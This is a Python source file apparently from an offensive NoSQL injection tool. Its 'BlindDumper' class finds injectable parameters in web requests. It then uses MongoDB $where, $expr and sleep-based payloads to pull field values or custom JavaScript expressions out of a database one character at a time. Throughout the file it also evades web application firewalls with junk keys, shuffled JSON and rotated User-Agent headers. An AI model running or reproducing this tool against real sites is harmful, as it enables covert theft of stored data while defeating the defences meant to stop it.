import copy
import string
import json
import sys
import difflib
import time
import statistics
import os
import hashlib
import concurrent.futures
import math
import random
import threading
from core.logger import Logger

WAF_HEADERS = {
    "Accept-Language": "en-US,en;q=0.9",
    "Referer": "https://www.google.com/",
    "Connection": "close"
}

class BlindDumper:
    def __init__(self, requester, url, method, original_data, baseline_response, threads=1, target_expression=None, target_param=None, prefix="", suffix="", time_sec=None, retries=3):
        self.requester = requester
        self.url = url
        self.method = method
        self.original_data = original_data
        self.baseline = baseline_response
        self.threads = threads
        self.target_param = target_param
        self.prefix = prefix
        self.suffix = suffix
        self.logger = Logger()
        
        self.forced_sleep = time_sec
        self.max_retries = retries
        
        self.current_strategy = None
        self.avg_latency = 0
        self.network_jitter = 0 
        self.time_threshold = 0
        self.sleep_time = 2.0
        self.last_response = None
        
        self.natural_ratio = 1.0  
        self.dynamic_threshold = 0.95 
        
        self.target_expression = target_expression 
        
        self.file_lock = threading.Lock()
        self.session_dir = "sessions"
        
        if not os.path.exists(self.session_dir):
            try:
                os.makedirs(self.session_dir)
            except OSError as e:
                self.logger.error(f"Failed to create session directory: {e}")
            
        self.session_file = self._get_session_filename()
        self.session_data = self._load_session()

        self.charset = string.ascii_letters + string.digits + string.punctuation + " "

        self.strategies = [
            {
                "name": "JavaScript Injection ($where) - Binary Fast",
                "type": "binary",
                "detection": "boolean",
                "test": lambda k: {"$where": self._wrap_payload(f"this.{k} && this.{k}.toString().length > 0")},
                "len": lambda k, l: {"$where": self._wrap_payload(f"this.{k}.toString().length == {l}")},
                "gt": lambda k, idx, v: {"$where": self._wrap_payload(f"this.{k}.toString().charCodeAt({idx}) > {v}")}
            },
            {
                "name": "Aggregation ($expr) - Binary Fast (Safe Reference)",
                "type": "binary",
                "detection": "boolean",
                "test": lambda k: {"$expr": {"$gt": [{"$strLenCP": {"$toString": f"${k}"}}, 0]}},
                "len": lambda k, l: {"$expr": {"$eq": [{"$strLenCP": {"$toString": f"${k}"}}, l]}},
                "gt": lambda k, idx, v: {"$expr": {"$gt": [{"$strCPAt": {"source": {"$toString": f"${k}"}, "index": idx}}, v]}}
            },
            {
                "name": "JavaScript Time-Based ($where) - Adaptive",
                "type": "binary",
                "detection": "time",
                "test": lambda k: {"$where": self._wrap_payload(f"sleep({int(self.sleep_time * 1000)})")}, 
                "len": lambda k, l: {"$where": self._wrap_payload(f"if(this.{k}.toString().length == {l}) sleep({int(self.sleep_time * 1000)})")},
                "gt": lambda k, idx, v: {"$where": self._wrap_payload(f"if(this.{k}.toString().charCodeAt({idx}) > {v}) sleep({int(self.sleep_time * 1000)})")}
            },
            {
                "name": "Chained Combo ($regex + $ne + $where)",
                "type": "binary",
                "detection": "boolean",
                "test": lambda k: {"$regex": ".*", "$ne": "NO_MATCH", "$where": self._wrap_payload("return true")},
                "len": lambda k, l: {"$regex": ".*", "$ne": "NO_MATCH", "$where": self._wrap_payload(f"this.{k}.length == {l}")},
                "gt": lambda k, idx, v: {"$regex": ".*", "$ne": "NO_MATCH", "$where": self._wrap_payload(f"this.{k}.charCodeAt({idx}) > {v}")}
            }
        ]

    def _wrap_payload(self, code):
        return f"{self.prefix}{code}{self.suffix}"

    def _get_session_filename(self):
        try:
            expr_key = self.target_expression if self.target_expression else "default"
            unique_str = f"{self.method}{self.url}{json.dumps(self.original_data, sort_keys=True)}{expr_key}"
            session_hash = hashlib.md5(unique_str.encode()).hexdigest()
            return os.path.join(self.session_dir, f"{session_hash}.json")
        except Exception as e:
            self.logger.error(f"Error generating session filename: {e}")
            return os.path.join(self.session_dir, "unknown_session.json")

    def _load_session(self):
        if os.path.exists(self.session_file):
            try:
                with open(self.session_file, "r") as f:
                    return json.load(f)
            except json.JSONDecodeError:
                self.logger.warning("Session file is corrupted. Starting fresh.")
            except Exception as e:
                self.logger.error(f"Could not load session: {e}")
        return {"injections": {}}

    def _update_param_session(self, param, key, value):
        with self.file_lock:
            try:
                if "injections" not in self.session_data:
                    self.session_data["injections"] = {}
                if param not in self.session_data["injections"]:
                    self.session_data["injections"][param] = {}
                
                self.session_data["injections"][param][key] = value
                
                with open(self.session_file, "w") as f:
                    json.dump(self.session_data, f, indent=4)
            except Exception as e:
                self.logger.error(f"Failed to save session data: {e}")

    def _get_param_session(self, param):
        return self.session_data.get("injections", {}).get(param, {})

    def _save_session(self, key, value):
        with self.file_lock:
            try:
                self.session_data[key] = value
                with open(self.session_file, "w") as f:
                    json.dump(self.session_data, f, indent=4)
            except Exception as e:
                self.logger.error(f"Failed to save general session data: {e}")

    def run(self):
        if self.target_expression:
            self.process_custom_expression()
            return

        self.logger.info(f"Starting Module: Adaptive Blind Extraction (Threads: {self.threads})")
        if self.prefix or self.suffix:
            self.logger.info(f"Using Prefix: '{self.prefix}' | Suffix: '{self.suffix}'")
        
        self.calibrate_network()
        self.calibrate_content()

        targets = []
        saved_injections = self.session_data.get("injections", {})
        
        if saved_injections:
            self.logger.info(f"Resuming scan for {len(saved_injections)} parameters from session.")
            for param, data in saved_injections.items():
                if self.target_param and param != self.target_param:
                    continue
                try:
                    strategy_idx = data.get("strategy_index", 0)
                    targets.append((param, self.strategies[strategy_idx]))
                except IndexError:
                    self.logger.warning(f"Invalid strategy index for parameter '{param}' in session.")
        else:
            self.logger.info("Scanning all parameters for injection points...")
            targets = self.scan_all_injection_points()
            
            if not targets:
                self.logger.error("No injectable parameters found.")
                return
            for param, strategy in targets:
                self._update_param_session(param, "strategy_index", self.strategies.index(strategy))
                self.logger.success(f"Found Injection Point: '{param}' | Strategy: {strategy['name']}")

        for param, strategy in targets:
            self.process_parameter(param, strategy)
            
    def process_custom_expression(self):
        self.logger.info(f"--- Processing Custom Expression ---")
        
        dummy_param = 'custom_query'
        js_strategies = [self.strategies[0], self.strategies[2]]
        working_strategy = None
        
        for strategy in js_strategies:
            self.logger.info(f"Testing custom query with strategy: {strategy['name']}")
            self.current_strategy = strategy
            
            test_expr_core = f"String({self.target_expression}).length > 0"
            is_sleep = "sleep" in str(strategy['test']("x"))
            
            if is_sleep:
                 wrapped_expr = f"if(String({self.target_expression}).length >= 0) sleep({int(self.sleep_time * 1000)})"
            else:
                 wrapped_expr = test_expr_core

            payload = {"$where": self._wrap_payload(wrapped_expr)}

            data = copy.deepcopy(self.original_data)
            first_key = list(data.keys())[0]
            data[first_key] = payload
            
            if self.reliable_check(data):
                working_strategy = strategy
                break
        
        if not working_strategy:
            self.logger.error("Failed to find a working strategy for custom expression.")
            working_strategy = self.strategies[0]

        self.current_strategy = working_strategy
        self.logger.success(f"Using strategy: {working_strategy['name']}")

        self.logger.info(f"Finding length for custom query...")
        data_length = self.get_length(dummy_param, custom_expression=self.target_expression) 
        
        if not data_length:
            self.logger.error("Failed to retrieve length for custom query.")
            return

        self.logger.info(f"Length: {data_length}")
        self.logger.info(f"Extracting data for Custom Expression...")
        
        extracted_data = self.extract_binary(dummy_param, data_length, current_data="", target_expression=self.target_expression) 
        
        if extracted_data:
            print("\n" + "="*60)
            self.logger.success(f"CUSTOM EXPRESSION DUMPED: {extracted_data}")
            print("="*60 + "\n")

    def process_parameter(self, param, strategy):
        self.logger.info(f"\n--- Processing Parameter: '{param}' ---")
        self.current_strategy = strategy
        param_session = self._get_param_session(param)

        if param_session.get("status") == "completed":
            self.logger.success(f"ALREADY DUMPED: {param_session.get('extracted_data')}")
            return

        if "data_length" in param_session:
            data_length = param_session["data_length"]
            self.logger.info(f"Resumed Length: {data_length}")
        else:
            self.logger.info(f"Finding length for '{param}'...")
            data_length = self.get_length(param) 
            if not data_length:
                self.logger.error(f"Failed to find length for '{param}'. Skipping.")
                return
            self._update_param_session(param, "data_length", data_length)
            self.logger.success(f"Length: {data_length}")

        self.logger.info(f"Extracting data for '{param}'...")
        current_extracted = param_session.get("extracted_data", "")
        
        extracted_data = self.extract_binary(param, data_length, current_extracted)
        
        if extracted_data:
            self._update_param_session(param, "extracted_data", extracted_data)
            self._update_param_session(param, "status", "completed")
            print("\n" + "="*60)
            self.logger.success(f"DUMPED ({param}): {extracted_data}")
            print("="*60 + "\n")

    def calibrate_network(self):
        """
        Network calibration by calculating standard deviation
        """
        if self.forced_sleep:
            self.sleep_time = float(self.forced_sleep)
            self.time_threshold = self.sleep_time * 0.8 
            self.logger.info(f"Manual Timing Enforced: Sleep={self.sleep_time}s")
            return

        latencies = []
        base_sleep = self.requester.global_delay
        
        print(f"{self.logger.B}[*] Calibrating network jitter (Advanced Statistics)...{self.logger.E}", end="\r")
        
        samples = 10 
        for _ in range(samples):
            try:
                time.sleep(base_sleep) 
                start = time.time()
                self._send_request(self.original_data) 
                latencies.append(time.time() - start)
            except Exception as e:
                self.logger.warning(f"Network error during calibration: {e}")

        if not latencies:
            self.logger.error("Calibration failed. Using conservative defaults.")
            self.avg_latency = 0.5
            self.network_jitter = 0.5
            self.threshold = 3.0
            self.sleep_time = 3.0
            return

        self.avg_latency = statistics.mean(latencies)
        
        if len(latencies) > 1:
            self.network_jitter = statistics.stdev(latencies)
        else:
            self.network_jitter = 0.1

        suggested_sleep = max(2.0, (self.network_jitter * 6) + 1.0)
        self.sleep_time = round(suggested_sleep, 2)

        self.time_threshold = self.avg_latency + (4 * self.network_jitter) + (self.sleep_time * 0.7)
        
        self.logger.info(f"Network Stats: Avg={round(self.avg_latency,3)}s | Jitter={round(self.network_jitter,3)}s")
        self.logger.info(f"Adaptive Timing: Sleep={self.sleep_time}s | Threshold={round(self.time_threshold,3)}s")

    def calibrate_content(self):
        print(f"{self.logger.B}[*] Calibrating dynamic content...{self.logger.E}", end="\r")
        ratios = []
        
        responses = [self.baseline]
        for _ in range(2):
            resp = self._send_request(self.original_data)
            if resp:
                responses.append(resp)
            time.sleep(0.5)
            
        if len(responses) < 2:
            self.logger.warning("Could not gather enough baselines for dynamic calibration.")
            return

        base_text = responses[0].text
        for i in range(1, len(responses)):
            matcher = difflib.SequenceMatcher(None, base_text, responses[i].text)
            ratios.append(matcher.ratio())
            
        if ratios:
            self.natural_ratio = min(ratios)
            if self.natural_ratio < 0.99:
                self.dynamic_threshold = self.natural_ratio - 0.05
                self.logger.info(f"Dynamic Content Detected! Natural Similarity: {round(self.natural_ratio*100, 1)}%. New Threshold: {round(self.dynamic_threshold*100, 1)}%")
            else:
                self.dynamic_threshold = 0.98
                self.logger.info("Page content seems static. High precision mode enabled.")
        print("")

    def _shuffle_json_keys(self, obj):
        if isinstance(obj, dict):
            shuffled_keys = list(obj.keys())
            random.shuffle(shuffled_keys)
            
            new_obj = {}
            for key in shuffled_keys:
                new_obj[key] = self._shuffle_json_keys(obj[key])
            return new_obj
        elif isinstance(obj, list):
            return [self._shuffle_json_keys(item) for item in obj]
        else:
            return obj

    def _apply_waf_evasion(self, data):
        evasive_data = copy.deepcopy(data)
        for _ in range(random.randint(1, 3)):
            junk_key = "_" + ''.join(random.choices(string.ascii_lowercase, k=random.randint(3, 5)))
            junk_value = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(4, 10)))
            evasive_data[junk_key] = junk_value
        
        evasive_data = self._shuffle_json_keys(evasive_data)

        if hasattr(self, 'user_agents') and self.user_agents:
            self.requester.headers["User-Agent"] = random.choice(self.user_agents)
        return evasive_data

    def _send_request(self, data):
        max_retries = self.max_retries
        base_delay = self.requester.global_delay 
        
        current_ua = self.requester.headers.get("User-Agent", "")
        new_ua_prefix = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
        self.requester.headers["User-Agent"] = new_ua_prefix + current_ua[10:]
        
        for attempt in range(max_retries):
            try:
                final_data = self._apply_waf_evasion(data)
                if base_delay == 0.0:
                    time.sleep(random.uniform(0.1, 0.5))
                
                response = self.requester.send(self.url, self.method, final_data)
                
                if response is not None:
                    if response.status_code == 429:
                        wait_time = base_delay * (attempt + 1) * 3
                        self.logger.warning(f"Rate limit hit (429). Waiting {wait_time}s...")
                        time.sleep(wait_time)
                        continue
                    if response.status_code == 403 and self.baseline.status_code != 403:
                         self.logger.warning(f"Access Denied (403). Retrying...")
                         time.sleep(5)
                         continue
                    if response.status_code >= 500:
                        time.sleep(2)
                        continue
                return response
            except Exception:
                if attempt == max_retries - 1:
                    pass 
                time.sleep(1)
        return None

    def reliable_check(self, data):
        self.last_response = None
        detection_type = self.current_strategy["detection"]
        
        if detection_type == "time":
            start = time.time()
            self._send_request(data)
            duration = time.time() - start
            
            if duration > self.time_threshold:
                start_confirm = time.time()
                self._send_request(data)
                duration_confirm = time.time() - start_confirm
                
                if duration_confirm > self.time_threshold:
                    return True
                else:
                    return False
            
            return False
        else:
            resp = self._send_request(data)
            self.last_response = resp
            if resp is None: return None 
            return self.is_true(resp)

    def is_true(self, response):
        if not response: return False
        
        if response.status_code != self.baseline.status_code: 
            return True
            
        matcher = difflib.SequenceMatcher(None, self.baseline.text, response.text)
        similarity = matcher.ratio()
        
        if similarity < self.dynamic_threshold:
            return True
            
        return False

    def scan_all_injection_points(self):
        found_points = []
        self.logger.info(f"Scanning parameters...")
        for key in self.original_data.keys():
            if self.target_param and key != self.target_param: continue
            for strategy in self.strategies:
                sys.stdout.write(f"\r[~] Testing param '{key}' with strategy: {strategy['name']}...".ljust(80))
                sys.stdout.flush()
                try:
                    self.current_strategy = strategy 
                    payload = strategy["test"](key)
                    data = copy.deepcopy(self.original_data)
                    data[key] = payload
                    if self.reliable_check(data):
                        found_points.append((key, strategy))
                        break 
                except Exception: continue
        return found_points

    def get_length(self, param, custom_expression=None):
        self.logger.info(f"Using Binary Search for length (Range: 1-1000)...")
        
        low = 1
        high = 1000
        last_valid_len = 0
        
        if custom_expression:
            base_logic = lambda mid: f"String({custom_expression}).length >= {mid}"
        else:
            base_logic = lambda mid: f"this.{param}.toString().length >= {mid}"

        while low <= high:
            mid = (low + high) // 2
            try:
                js_expr = base_logic(mid)
                is_sleep = "sleep" in str(self.current_strategy["test"]("x"))
                
                if is_sleep:
                    core_logic = f"if({js_expr}) sleep({int(self.sleep_time * 1000)})"
                else:
                    core_logic = js_expr
                
                payload = {"$where": self._wrap_payload(core_logic)}
                
                data = copy.deepcopy(self.original_data)
                
                if custom_expression:
                    first_key = list(data.keys())[0]
                    data[first_key] = payload
                else:
                    data[param] = payload
                
                sys.stdout.write(f"\r[?] Checking length >= {mid}".ljust(40))
                sys.stdout.flush()
                
                result = self.reliable_check(data)
                
                if result is True:
                    last_valid_len = mid
                    low = mid + 1
                elif result is False:
                    high = mid - 1
                elif result is None:
                    return None
            except Exception: return None
        
        print("") 
        if last_valid_len > 0:
            return last_valid_len
        return None

    def _worker_binary(self, param, index, target_expression=None):
        low = 0
        high = 1114111 
        while low <= high:
            mid = (low + high) // 2
            try:
                if target_expression:
                    check_expr = f"String({target_expression}).charCodeAt({index}) > {mid}"
                else:
                    check_expr = f"this.{param}.toString().charCodeAt({index}) > {mid}"

                strategy_name = self.current_strategy["name"]
                if "Aggregation ($expr)" in strategy_name:
                    if target_expression:
                        js_code = f"function() {{ return {check_expr} }}"
                        payload = {
                            "$expr": {
                                "$function": {
                                    "body": js_code,
                                    "args": [],
                                    "lang": "js"
                                }
                            }
                        }
                    else:
                        payload = self.current_strategy["gt"](param, index, mid)
                else:
                    is_sleep = "sleep" in str(self.current_strategy["test"]("x"))
                    if is_sleep:
                         core_logic = f"if({check_expr}) sleep({int(self.sleep_time * 1000)})"
                    else:
                         core_logic = check_expr 
                         
                    payload = {"$where": self._wrap_payload(core_logic)}

                data = copy.deepcopy(self.original_data)
                
                if target_expression:
                    first_key = list(data.keys())[0]
                    data[first_key] = payload
                else:
                    data[param] = payload
                
                result = self.reliable_check(data)
                if result is None: return "?"
                if result: low = mid + 1
                else: high = mid - 1
            except Exception:
                return "?"
        try: return chr(low)
        except: return "?"

    def extract_binary(self, param, length, current_data="", target_expression=None):
        if self.current_strategy["detection"] == "time": workers = 1 
        else: workers = self.threads

        chars = list(current_data)
        if len(chars) < length: chars.extend(['?'] * (length - len(chars)))
        missing_indices = [i for i, c in enumerate(chars) if c == '?']

        self.logger.info(f"Extraction started (Length: {length}, Missing: {len(missing_indices)})")
        
        if not missing_indices: return "".join(chars)
            
        with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor:
            future_to_index = {executor.submit(self._worker_binary, param, i, target_expression): i for i in missing_indices}
            
            for future in concurrent.futures.as_completed(future_to_index):
                i = future_to_index[future]
                try:
                    char = future.result()
                    chars[i] = char
                    current_str = "".join(chars)
                    self._update_param_session(param, "extracted_data", current_str)
                    sys.stdout.write(f"\r[+] Extracting ({param}): {current_str}")
                    sys.stdout.flush()
                except Exception:
                    pass
        print("")
        return "".join(chars)

    def extract_linear(self, param, length, current_data=""):
        return self.extract_binary(param, length, current_data)

    def get_user_agents(self):
        try:
            ua_file_path = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(__file__))), "user-agents.txt")
            with open(ua_file_path, "r") as f:
                return [line.strip() for line in f.readlines() if line.strip()]
        except FileNotFoundError:
            self.logger.error("User-agents.txt not found.")
            return []